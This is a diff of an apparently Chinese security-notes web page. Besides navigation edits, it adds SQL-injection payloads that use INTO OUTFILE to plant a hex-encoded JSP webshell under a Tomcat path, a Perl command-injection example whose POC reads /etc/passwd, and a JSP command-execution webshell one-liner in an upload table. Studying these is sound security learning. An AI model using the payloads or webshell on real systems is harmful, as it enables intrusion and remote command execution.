@@ -2513,6 +2513,18 @@
 
 
   <li class="md-nav__item">
+    <a href="../../design/data_structure/hashtable/" title="hashtable" class="md-nav__link">
+      hashtable
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
     <a href="../../design/data_structure/red_black_tree/" title="二叉查找树" class="md-nav__link">
       二叉查找树
     </a>
@@ -2539,18 +2551,6 @@
   <li class="md-nav__item">
     <a href="../../design/data_structure/堆/" title="堆" class="md-nav__link">
       堆
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../design/data_structure/查找排序/" title="查找排序" class="md-nav__link">
-      查找排序
     </a>
   </li>
 
@@ -3782,6 +3782,13 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#perl_1" title="Perl" class="md-nav__link">
+    Perl
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -4702,6 +4709,13 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#perl_1" title="Perl" class="md-nav__link">
+    Perl
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -5332,6 +5346,34 @@
 <li>猜解列数<code>flag' union select 1,2,3 #</code>, 返回的数据为1, 2, 3</li>
 <li>猜解数据库名, 表名<code>flag' and exist(select * from xxx) #</code>或<code>' and 0 union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS #</code>, 使用<code>and 0</code>先将干扰数据清零, 再查询<code>INFORMATION_SCHEMA</code>库中的<code>COLUMNS</code>表获取数据库名和表名</li>
 <li>猜解列名, 数据类型<code>flag' and exist(select xxx from xxx) #</code>或<code>' and 0 union select 1,column_name,data_type from information_schema.columns where table_name='xxx'#</code></li>
+<li>写入文件: <code>select "hackkkk" into outfile "/tmp/hackkkk.jsp";</code></li>
+<li>
+<p>在文件开头写入内容:</p>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
+2
+3
+4
+5
+6</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>mysql&gt; <span class="k">select</span> <span class="s2">&quot;hackkkk&quot;</span> into outfile <span class="s2">&quot;/tmp/hackkk.jsp&quot;</span> LINES STARTING BY 0x3c3f70687020706870696e666f28293b3f3e<span class="p">;</span>
+Query OK, <span class="m">1</span> row affected <span class="o">(</span><span class="m">0</span>.02 sec<span class="o">)</span>
+mysql&gt; quit
+Bye
+$ cat /tmp/hackkk.jsp
+&lt;?php phpinfo<span class="o">()</span><span class="p">;</span>?&gt;hackkkk
+</pre></div>
+</td></tr></table>
+
+</li>
+<li>
+<p>将<a href="#_11">jsp一句话木马</a>转换为十六进制<code>3c25696628726571756573742e676574506172616d657465722822636d642229213d6e756c6c297b6a6176612e696f2e496e70757453747265616d20696e3d52756e74696d652e67657452756e74696d6528292e6578656328726571756573742e676574506172616d657465722822636d642229292e676574496e70757453747265616d28293b696e742061203d202d313b627974655b5d2062203d206e657720627974655b323034385d3b6f75742e7072696e7428223c7072653e22293b7768696c652828613d696e2e7265616428622929213d2d31297b6f75742e7072696e746c6e286e657720537472696e67286229293b7d6f75742e7072696e7428223c2f7072653e22293b7d253e</code></p>
+</li>
+<li>
+<p>先闭合原字符串, 再加<code>#</code>忽略后面语句, 中间添加POC: 使用<code>/**/</code>绕过空格校验, 在union的时候, 注意前后查询的参数个数相同</p>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>zzz&#39;/**/union/**/select+0x3c25696628726571756573742e676574506172616d657465722822636d642229213d6e756c6c297b6a6176612e696f2e496e70757453747265616d20696e3d52756e74696d652e67657452756e74696d6528292e6578656328726571756573742e676574506172616d657465722822636d642229292e676574496e70757453747265616d28293b696e742061203d202d313b627974655b5d2062203d206e657720627974655b323034385d3b6f75742e7072696e7428223c7072653e22293b7768696c652828613d696e2e7265616428622929213d2d31297b6f75742e7072696e746c6e286e657720537472696e67286229293b7d6f75742e7072696e7428223c2f7072653e22293b7d253e+into+outfile+&#39;/usr/local/tomcat/webapps/ucenter/kk.jsp&#39;#
+</pre></div>
+</td></tr></table>
+
+</li>
 </ul>
 <h3 id="_7">框架<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
 <h4 id="jdbc">JDBC<a class="headerlink" href="#jdbc" title="Permanent link">&para;</a></h4>
@@ -5713,6 +5755,35 @@ $ perl xxx.pl
 <div class="admonition quote">
 <p class="admonition-title"><a href="../../coding/go/go%E8%AF%AD%E8%A8%80%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B/#os">OS命令注入</a></p>
 </div>
+<h3 id="perl_1">Perl<a class="headerlink" href="#perl_1" title="Permanent link">&para;</a></h3>
+<ul>
+<li>
+<p>system()</p>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
+2
+3
+4
+5
+6
+7
+8
+9</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="c1"># $username为用户输入</span>
+<span class="nv">$username</span> <span class="o">=</span> <span class="n">param</span> <span class="p">(</span><span class="s">&quot;username&quot;</span><span class="p">);</span>
+<span class="c1"># 使用$username拼接命令</span>
+<span class="nb">system</span> <span class="p">(</span><span class="s">&quot;cat /usr/stats/$username&quot;</span><span class="p">);</span>
+<span class="c1"># POC: xxx; cat /etc/passwd</span>
+<span class="c1"># 正常情况调用execvp()来运行“cat”, 如果包含Shell元字符, 则通过Shell来解释</span>
+
+<span class="c1"># 消减措施: 作为参数列表, 但是存在路径跨越如:../../etc/passwd</span>
+<span class="nb">system</span> <span class="p">(</span><span class="s">&quot;cat&quot;</span><span class="p">,</span> <span class="s">&quot;/usr/stats/$username&quot;</span><span class="p">);</span>
+</pre></div>
+</td></tr></table>
+
+</li>
+<li>
+<p>exec()</p>
+</li>
+</ul>
 <h2 id="ognl">OGNL注入<a class="headerlink" href="#ognl" title="Permanent link">&para;</a></h2>
 <h2 id="_10">上传<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h2>
 <h3 id="_11">验证步骤<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
@@ -5741,7 +5812,7 @@ $ perl xxx.pl
 </tr>
 <tr>
 <td>jsp</td>
-<td><code>&lt;%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%&gt;</code></td>
+<td><code>&lt;%if(request.getParameter("cmd")!=null){java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("&lt;pre&gt;");while((a=in.read(b))!=-1){out.println(new String(b));}out.print("&lt;/pre&gt;");}%&gt;</code></td>
 </tr>
 </tbody>
 </table>
